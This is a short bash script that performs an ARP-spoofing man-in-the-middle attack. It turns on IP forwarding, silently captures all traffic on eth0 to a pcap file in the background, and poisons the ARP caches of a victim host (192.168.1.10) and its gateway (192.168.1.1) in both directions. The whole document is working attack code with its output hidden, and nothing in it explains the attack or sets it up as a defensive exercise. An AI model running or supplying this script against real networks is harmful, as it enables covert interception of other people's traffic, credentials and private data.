#! /bin/bash

# Enable Ip forwarding
sysctl -w net.ipv4.ip_forward=1

# Capture packets
tcpdump -i eth0 -Z root -w capture.pcap > /dev/null 2> /dev/null &

# Redirect packets
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 > /dev/null 2> /dev/null &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 > /dev/null 2> /dev/null &

